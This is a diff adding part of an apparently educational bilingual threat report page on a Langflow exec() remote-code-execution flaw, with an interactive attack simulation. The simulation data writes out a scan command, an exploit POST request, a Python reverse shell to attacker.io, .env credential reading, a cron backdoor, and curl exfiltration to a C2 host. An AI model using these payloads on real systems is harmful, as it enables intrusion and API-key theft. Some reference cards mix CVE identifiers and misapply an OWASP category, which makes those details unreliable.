+        <div class="poc-card-desc" data-en="Sysdig TRT analysis documenting first exploitation within 20 hours of advisory, attacker tooling derived from advisory text, and API key harvesting campaign targeting cloud-deployed Langflow instances." data-tr="Sysdig TRT analizi: advisory'den 20 saat içinde ilk istismarı, advisory metninden türetilen saldırgan araçlarını ve cloud'da dağıtılmış Langflow instance'larını hedef alan API key toplama kampanyasını belgeliyor.">Sysdig TRT analysis documenting first exploitation within 20 hours of advisory, attacker tooling derived from advisory text, and API key harvesting campaign targeting cloud-deployed Langflow instances.</div>
+        <a class="poc-card-link" href="https://sysdig.com/blog/cve-2025-3248-langflow-rce-exploited-in-the-wild/" target="_blank" rel="noopener" data-en="Read analysis" data-tr="Analizi Oku">Read analysis</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag poc">poc</span>
+        <div class="poc-card-title" data-en="Version 1.8.2 is Still Vulnerable" data-tr="1.8.2 Sürümü Hâlâ Savunmasız">Version 1.8.2 is Still Vulnerable</div>
+        <div class="poc-card-src">JFrog Security Research</div>
+        <div class="poc-card-desc" data-en="JFrog research demonstrating that the initially reported patch (v1.8.2) does not fully remediate the vulnerability. Includes technical proof-of-concept confirming exec() remains accessible in v1.8.2. Only v1.9.0+ is safe." data-tr="JFrog araştırması, başlangıçta bildirilen yamanın (v1.8.2) güvenlik açığını tam olarak gidermediğini kanıtlıyor. v1.8.2'de exec()'in hâlâ erişilebilir olduğunu doğrulayan teknik proof-of-concept içeriyor. Yalnızca v1.9.0+ güvenlidir.">JFrog research demonstrating that the initially reported patch (v1.8.2) does not fully remediate the vulnerability. Includes technical proof-of-concept confirming exec() remains accessible in v1.8.2. Only v1.9.0+ is safe.</div>
+        <a class="poc-card-link" href="https://jfrog.com/blog/langflow-rce-vulnerability-cve-2025-3248/" target="_blank" rel="noopener" data-en="Read analysis" data-tr="Analizi Oku">Read analysis</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag advisory">advisory</span>
+        <div class="poc-card-title" data-en="CISA KEV — Langflow Code Injection" data-tr="CISA KEV — Langflow Kod Enjeksiyonu">CISA KEV — Langflow Code Injection</div>
+        <div class="poc-card-src">CISA Known Exploited Vulnerabilities</div>
+        <div class="poc-card-desc" data-en="CISA official KEV catalog entry added 2026-03-25. Federal civilian agencies required to remediate by due date. Entry confirms active exploitation in the wild and mandates immediate action for affected organizations." data-tr="CISA resmi KEV kataloğu girişi 2026-03-25 tarihinde eklendi. Federal sivil kurumların son tarihe kadar düzeltme yapması gerekiyor. Giriş, vahşi ortamda aktif istismarı doğruluyor ve etkilenen kuruluşlar için acil eylem zorunluluğu getiriyor.">CISA official KEV catalog entry added 2026-03-25. Federal civilian agencies required to remediate by due date. Entry confirms active exploitation in the wild and mandates immediate action for affected organizations.</div>
+        <a class="poc-card-link" href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener" data-en="View KEV entry" data-tr="KEV Girişini Görüntüle">View KEV entry</a>
+      </div>
+
+      <div class="poc-card">
+        <span class="poc-tag writeup">writeup</span>
+        <div class="poc-card-title" data-en="OWASP ML Security Top 10 — AI/ML exec() Patterns" data-tr="OWASP ML Güvenlik Top 10 — AI/ML exec() Kalıpları">OWASP ML Security Top 10 — AI/ML exec() Patterns</div>
+        <div class="poc-card-src">OWASP Machine Learning Security</div>
+        <div class="poc-card-desc" data-en="OWASP ML Security Top 10 guidance covering unsafe code execution patterns in AI/ML frameworks. Langflow CVE-2026-33017 is a textbook example of ML07: Training Data Poisoning combined with unsafe execution of user-provided code." data-tr="AI/ML framework'lerinde güvenli olmayan kod yürütme kalıplarını kapsayan OWASP ML Security Top 10 kılavuzu. Langflow CVE-2026-33017, ML07: Eğitim Verisi Zehirlenmesi ile kullanıcı tarafından sağlanan kodun güvenli olmayan yürütülmesinin birleştiği ders kitabı niteliğinde bir örnektir.">OWASP ML Security Top 10 guidance covering unsafe code execution patterns in AI/ML frameworks. Langflow CVE-2026-33017 is a textbook example of ML07: Training Data Poisoning combined with unsafe execution of user-provided code.</div>
+        <a class="poc-card-link" href="https://owasp.org/www-project-machine-learning-security-top-10/" target="_blank" rel="noopener" data-en="Read writeup" data-tr="Analizi Oku">Read writeup</a>
+      </div>
+
+    </div>
+  </div>
+
+</main>
+
+<footer>
+  <strong>TI-DE</strong> — Threat Intelligence &amp; Detection Engineering &nbsp;|&nbsp;
+  <a href="https://mazlumbaydar.github.io/TI-DE/" data-en="All Reports" data-tr="Tüm Raporlar">All Reports</a> &nbsp;|&nbsp;
+  <span data-en="CVE-2026-33017 Report" data-tr="CVE-2026-33017 Raporu">CVE-2026-33017 Report</span> &nbsp;|&nbsp;
+  <span style="color:var(--muted);font-size:0.72rem" data-en="For educational and detection engineering purposes only." data-tr="Yalnızca eğitim ve tespit mühendisliği amaçlıdır.">For educational and detection engineering purposes only.</span>
+</footer>
+
+<script>
+/* ============================================================
+   TI-DE Report Script — CVE-2026-33017
+   EN/TR bilingual + dark/light theme + attack simulation
+   ============================================================ */
+
+// ── SIMULATION DATA ──────────────────────────────────────────
+const ATV_STEPS = [
+  {
+    node: 0, conn: null, connType: '', nodeType: 'active',
+    stepLabel: 'STEP 1 — Target Discovery (Mar 17 + 20 hrs)',
+    stepLabelTR: 'ADIM 1 — Hedef Keşfi (17 Mart + 20 saat)',
+    text: 'Attacker derives a working exploit directly from advisory text and converts it to a Nuclei template. Mass scanning begins immediately, targeting port 7860 on cloud providers.',
+    textTR: 'Saldırgan, advisory metninden working exploit türetir ve Nuclei template\'e çevirir. 7860 numaralı portta cloud provider\'larda anlık tarama başlar.',
+    cmd: 'nuclei -t langflow-rce-cve-2026-33017.yaml \\\n  -list cloud_ips.txt -rate-limit 1000\n\n# Template checks: POST /api/v1/build_public_tmp/test/flow\n# Success: HTTP 200 with exec() output in response',
+    explain: 'Nuclei templates for known CVEs are publicly available within hours of disclosure. This means the attacker only needs to know the CVE exists, not reverse-engineer the vulnerability themselves.',
+    explainTR: 'Bilinen CVE\'ler için Nuclei template\'leri ifşadan saatler içinde kamuya açık hale gelir. Bu, saldırganın güvenlik açığını tersine mühendislik yapmak yerine yalnızca CVE\'nin varlığını bilmesi gerektiği anlamına gelir.'
+  },
+  {
+    node: 1, conn: 0, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 2 — Unauthenticated HTTP POST',
+    stepLabelTR: 'ADIM 2 — Kimlik Doğrulamasız HTTP POST',
+    text: 'The vulnerable endpoint processes flow node data without any authentication. A single POST request with malicious JSON is all that is needed for code execution.',
+    textTR: 'Güvenlik açığı olan endpoint, herhangi bir kimlik doğrulaması olmadan flow düğümü verilerini işler. Kod yürütme için tek bir kötü niyetli JSON içeren POST isteği yeterlidir.',
+    cmd: 'POST /api/v1/build_public_tmp/aaaa1111/flow HTTP/1.1\nHost: langflow.victim.ai:7860\nContent-Type: application/json\n\n{"nodes":[{"data":{"node":{"template":{\n  "code":{"value":"import os; os.system(\'id\')"}}}}}]}',
+    explain: 'The flow_id in the URL path can be any value — the endpoint doesn\'t validate whether the flow exists. Combined with zero auth, this makes the attack completely frictionless.',
+    explainTR: 'URL yolundaki flow_id herhangi bir değer olabilir — endpoint, akışın var olup olmadığını doğrulamaz. Sıfır auth ile birleştiğinde bu, saldırıyı tamamen sürtünmesiz hale getirir.'
+  },
+  {
+    node: 2, conn: 1, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 3 — Langflow Parses Node Data',
+    stepLabelTR: 'ADIM 3 — Langflow Düğüm Verisini İşler',
+    text: 'The Langflow flow execution engine extracts the "code" value from the JSON and passes it to Python exec() without sanitization. The exec() call has full access to the Python runtime and OS.',
+    textTR: 'Langflow flow yürütme motoru, JSON\'dan "code" değerini çıkarır ve herhangi bir sanitizasyon olmadan Python exec()\'e geçirir. exec() çağrısı Python runtime ve işletim sistemine tam erişime sahiptir.',
+    cmd: '# Langflow source — src/backend/base/langflow/api/v1/build.py\n# (simplified)\ndef build_flow(flow_data):\n    for node in flow_data["nodes"]:\n        code = node["data"]["node"]["template"]["code"]["value"]\n        exec(code)  # ← NO sandboxing, NO AST check',
+    explain: 'Python exec() is inherently unsafe for user-controlled input. There is no reliable sandboxing that can fully restrict exec() — the only fix is to not call exec() with untrusted data.',
+    explainTR: 'Python exec() doğası gereği kullanıcı kontrollü girdi için güvenli değildir. exec()\'i tam olarak kısıtlayabilecek güvenilir bir sandbox yoktur — tek düzeltme, exec()\'i güvenilmeyen verilerle çağırmamaktır.'
+  },
+  {
+    node: 3, conn: 2, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 4 — Python exec() Achieves RCE',
+    stepLabelTR: 'ADIM 4 — Python exec() RCE Sağlar',
+    text: 'Arbitrary Python runs with Langflow process permissions. Reverse shell established back to attacker. Full filesystem access, network access, and memory access from Langflow\'s runtime context.',
+    textTR: 'Arbitrary Python, Langflow süreci izinleriyle çalışır. Saldırgana geri dönük reverse shell kurulur. Langflow\'un runtime bağlamından tam dosya sistemi, ağ ve bellek erişimi.',
+    cmd: '# Reverse shell payload via exec()\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("attacker.io",4444))\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])',
+    explain: 'The exec() call uses the default Python globals — importing socket, os, subprocess is unrestricted. Python\'s __import__ cannot be safely disabled without breaking legitimate functionality.',
+    explainTR: 'exec() çağrısı varsayılan Python global\'lerini kullanır — socket, os, subprocess içe aktarımı kısıtsızdır. Python\'ın __import__\'u, meşru işlevselliği bozmadan güvenli şekilde devre dışı bırakılamaz.'
+  },
+  {
+    node: 4, conn: 3, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 5 — Credential Harvesting',
+    stepLabelTR: 'ADIM 5 — Kimlik Bilgisi Toplama',
+    text: 'The .env file and environment variables are read. Langflow instances typically hold API keys for AI services and cloud providers. These are the primary target of this campaign.',
+    textTR: '.env dosyası ve ortam değişkenleri okunur. Langflow instance\'ları genellikle AI servisleri ve cloud provider\'lar için API key\'leri barındırır. Bunlar bu kampanyanın birincil hedefidir.',
+    cmd: 'cat /app/.env\n# Output:\nOPENAI_API_KEY=sk-proj-...\nANTHROPIC_API_KEY=sk-ant-api03-...\nAWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtn...\nHUGGINGFACE_API_TOKEN=hf_...',
+    explain: 'AI platform credentials have high monetary value — stolen OpenAI API keys are sold on underground markets or used to generate millions of tokens at victim cost before detection.',
+    explainTR: 'AI platform kimlik bilgilerinin yüksek parasal değeri vardır — çalınan OpenAI API key\'leri yeraltı pazarlarında satılır veya tespitten önce kurban maliyetiyle milyonlarca token üretmek için kullanılır.'
+  },
+  {
+    node: 5, conn: 4, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 6 — Persistence + Exfiltration',
+    stepLabelTR: 'ADIM 6 — Kalıcılık + Dışarıya Sızdırma',
+    text: 'Cron job installs backdoor access. All API keys and .env contents exfiltrated to C2. AI workflows may be backdoored for prompt injection or model poisoning attacks.',
+    textTR: 'Cron job backdoor erişimi yükler. Tüm API key\'ler ve .env içerikleri C2\'ye sızdırılır. AI iş akışları prompt injection veya model poisoning saldırıları için arka kapıya alınmış olabilir.',
+    cmd: '# Persistence via cron\n(crontab -l 2>/dev/null; echo \\\n  "*/5 * * * * python3 /tmp/.lf/backdoor.py") | crontab -\n\n# Exfiltration\ncurl -s -X POST https://c2.attacker.io/collect \\\n  -d "host=$(hostname)&env=$(cat /app/.env|base64)"',
+    explain: 'Cron jobs survive container restarts if the host filesystem is mounted. The exfil uses HTTPS to blend with legitimate outbound traffic from an AI service host that frequently calls external APIs.',
+    explainTR: 'Host dosya sistemi mount edilmişse cron job\'lar container yeniden başlatmalarını atlatır. Sızdırma işlemi, sık sık harici API çağrıları yapan bir AI servis host\'unun meşru giden trafiğiyle karışmak için HTTPS kullanır.'
+  }
+];
+
+// ── SIMULATION STATE ──────────────────────────────────────────
+let simCurrentStep = 0;
+let simAutoTimer = null;
+let simIsReplaying = false;
+
+function simApplyStep(idx) {
+  const step = ATV_STEPS[idx];
+  const lang = document.documentElement.lang || 'en';
+  const isTR = lang === 'tr';
+
+  // Update step label
+  document.getElementById('simStepLabel').textContent = isTR ? step.stepLabelTR : step.stepLabel;
+
+  // Update text, cmd, explain
+  document.getElementById('simText').textContent = isTR ? step.textTR : step.text;
+  document.getElementById('simCmd').textContent = step.cmd;
+  document.getElementById('simExplain').textContent = isTR ? (step.explainTR || step.explain) : step.explain;
+
+  // Reset all nodes and connectors
+  for (let i = 0; i < 6; i++) {
+    const n = document.getElementById('node' + i);
+    if (n) { n.className = 'atk-node'; }
+  }
+  for (let i = 0; i < 5; i++) {
+    const c = document.getElementById('conn' + i);
+    if (c) { c.className = 'atk-connector'; }
+  }
+
+  // Apply active node
+  const activeNode = document.getElementById('node' + step.node);
+  if (activeNode) activeNode.className = 'atk-node ' + step.nodeType;
+
+  // Apply connector
+  if (step.conn !== null) {
+    const activeConn = document.getElementById('conn' + step.conn);
+    if (activeConn) {
+      activeConn.className = 'atk-connector ' + step.connType;
+      // Packet animation
+      const pkt = document.getElementById('pkt' + step.conn);
+      if (pkt) {
+        pkt.classList.remove('run');
+        void pkt.offsetWidth; // reflow
+        pkt.classList.add('run');
+      }
+    }
+  }
+
+  // Mark previously completed nodes
+  for (let i = 0; i < idx; i++) {
+    const s = ATV_STEPS[i];
+    const n = document.getElementById('node' + s.node);
+    if (n) n.className = 'atk-node pwned';
+    if (s.conn !== null) {
+      const c = document.getElementById('conn' + s.conn);
+      if (c) c.className = 'atk-connector danger';
+    }
+  }
+
+  // Update dots
+  for (let i = 0; i < 6; i++) {
+    const dot = document.getElementById('dot' + i);
+    if (!dot) continue;
+    dot.className = 'atk-dot';
+    if (i < idx) dot.classList.add('done');
+    else if (i === idx) dot.classList.add('current');
+  }
+
+  // Progress label
+  document.getElementById('simProgLabel').textContent = (idx + 1) + ' / 6';
+
+  // AUTO / REPLAY button state
+  const autoBtn = document.getElementById('autoBtn');
+  const stepBtn = document.getElementById('stepBtn');
+  if (idx === ATV_STEPS.length - 1) {
+    autoBtn.textContent = '↺ REPLAY';
+    stepBtn.disabled = true;
+  } else {
+    autoBtn.textContent = simAutoTimer ? '⏸ PAUSE' : '▶ AUTO';
+    stepBtn.disabled = false;
+  }
+}
+
+function simStep() {
+  if (simCurrentStep < ATV_STEPS.length - 1) {
+    simCurrentStep++;
+    simApplyStep(simCurrentStep);
+  }
+}
+
+function simJump(idx) {
+  if (simAutoTimer) {
+    clearInterval(simAutoTimer);
+    simAutoTimer = null;
+  }
+  simCurrentStep = idx;
+  simApplyStep(idx);
+  document.getElementById('autoBtn').textContent = '▶ AUTO';
+  document.getElementById('stepBtn').disabled = (idx === ATV_STEPS.length - 1);
+}
+
+function simAuto() {
+  const autoBtn = document.getElementById('autoBtn');
+
+  // Replay
+  if (simCurrentStep === ATV_STEPS.length - 1 || simIsReplaying) {
+    if (simAutoTimer) { clearInterval(simAutoTimer); simAutoTimer = null; }
+    simCurrentStep = 0;
+    simIsReplaying = false;
+    simApplyStep(0);
+    autoBtn.textContent = '⏸ PAUSE';
+    simAutoTimer = setInterval(() => {
+      if (simCurrentStep < ATV_STEPS.length - 1) {
+        simCurrentStep++;
+        simApplyStep(simCurrentStep);
+        if (simCurrentStep === ATV_STEPS.length - 1) {
+          clearInterval(simAutoTimer);
+          simAutoTimer = null;
+        }
+      }
+    }, 2600);
+    return;
+  }
+
+  // Pause
+  if (simAutoTimer) {
+    clearInterval(simAutoTimer);
+    simAutoTimer = null;
+    autoBtn.textContent = '▶ AUTO';
+    return;
+  }
+
+  // Start auto
+  autoBtn.textContent = '⏸ PAUSE';
+  simAutoTimer = setInterval(() => {
+    if (simCurrentStep < ATV_STEPS.length - 1) {
+      simCurrentStep++;
+      simApplyStep(simCurrentStep);
+      if (simCurrentStep === ATV_STEPS.length - 1) {
+        clearInterval(simAutoTimer);
+        simAutoTimer = null;
+        autoBtn.textContent = '↺ REPLAY';
+      }
+    }
+  }, 2600);
+}
+
+// ── LANGUAGE TOGGLE ───────────────────────────────────────────
+function applyLang() {
+  const lang = localStorage.getItem('ti-de-report-lang') || 'en';
+  document.documentElement.lang = lang;
+  const isTR = lang === 'tr';
+
+  document.getElementById('langBtn').textContent = isTR ? '🌐 EN' : '🌐 TR';
+
+  // Update all data-en / data-tr elements
+  document.querySelectorAll('[data-en]').forEach(el => {
+    const val = isTR ? (el.dataset.tr || el.dataset.en) : el.dataset.en;
+    if (val) el.innerHTML = val;
+  });
+
+  // Refresh simulation text if active
+  simApplyStep(simCurrentStep);
+}
+
+function toggleLang() {
+  const current = localStorage.getItem('ti-de-report-lang') || 'en';
+  localStorage.setItem('ti-de-report-lang', current === 'en' ? 'tr' : 'en');
+  applyLang();
+}
+
+// ── THEME TOGGLE ──────────────────────────────────────────────
+function applyTheme() {
+  const theme = localStorage.getItem('ti-de-report-theme') || 'dark';
+  document.documentElement.setAttribute('data-theme', theme);
+  document.getElementById('themeBtn').textContent = theme === 'dark' ? '☀ Light' : '🌙 Dark';
+}
+
+function toggleTheme() {
+  const current = localStorage.getItem('ti-de-report-theme') || 'dark';
+  localStorage.setItem('ti-de-report-theme', current === 'dark' ? 'light' : 'dark');
+  applyTheme();
+}
+
+// ── RULE ACCORDION ────────────────────────────────────────────
+function toggleRule(card) {
+  card.classList.toggle('open');
+}
+
+// ── SCROLL EFFECTS ────────────────────────────────────────────
+function handleScroll() {
+  const nav = document.getElementById('nav');
+  const prog = document.getElementById('prog');
+  const scrollTop = window.scrollY;
+  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+
+  nav.classList.toggle('scrolled', scrollTop > 60);
+  prog.style.width = docHeight > 0 ? (scrollTop / docHeight * 100) + '%' : '0%';
+
+  // Reveal sections
+  document.querySelectorAll('.reveal').forEach(el => {
+    if (el.getBoundingClientRect().top < window.innerHeight - 80) {
+      el.classList.add('visible');
+    }
+  });
+
+  // Chain steps
+  document.querySelectorAll('.chain-step').forEach(el => {
+    if (el.getBoundingClientRect().top < window.innerHeight - 60) {
+      el.classList.add('visible');
+    }
+  });
+}
+
+// ── STAT COUNTER ANIMATION ────────────────────────────────────
+function animateStats() {
+  document.querySelectorAll('.stat-num[data-t]').forEach(el => {
+    const target = parseFloat(el.dataset.t);
+    const isFloat = String(target).includes('.');
+    const duration = 1200;
+    const start = performance.now();
+    const step = (now) => {
+      const progress = Math.min((now - start) / duration, 1);
+      const eased = 1 - Math.pow(1 - progress, 3);
+      const current = target * eased;
+      el.textContent = isFloat ? current.toFixed(1) : Math.round(current);
+      if (progress < 1) requestAnimationFrame(step);
+      else el.textContent = isFloat ? target.toFixed(1) : target;
+    };
+    requestAnimationFrame(step);
+  });
+}
+
+// ── INIT ──────────────────────────────────────────────────────
+(function init() {
+  applyTheme();
+  applyLang();
+  simApplyStep(0);
+
+  window.addEventListener('scroll', handleScroll, { passive: true });
+  handleScroll();
+
+  // Animate stats once when overview enters view
+  const statGrid = document.getElementById('overview');
+  let statsAnimated = false;
+  const statObserver = new IntersectionObserver((entries) => {
+    entries.forEach(entry => {
+      if (entry.isIntersecting && !statsAnimated) {
+        statsAnimated = true;
+        animateStats();
+        statObserver.disconnect();
+      }
+    });
+  }, { threshold: 0.3 });
+  if (statGrid) statObserver.observe(statGrid);
+})();
+</script>
+</body>
+</html>
